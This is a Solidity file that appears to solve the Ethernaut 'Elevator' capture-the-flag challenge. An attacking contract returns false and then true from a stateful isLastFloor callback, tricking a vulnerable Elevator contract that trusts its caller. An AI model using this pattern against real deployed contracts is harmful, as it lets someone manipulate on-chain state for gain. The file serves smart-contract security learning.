// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}


contract Hack {
    uint8 counter;

    function elevate(uint256 _floor, address target) public {
        Elevator(target).goTo(_floor);

    }

    function isLastFloor(uint256) external returns (bool) {
        if (counter == 0){
            counter++;
            return false;
        }

        return true;
    }
}


contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}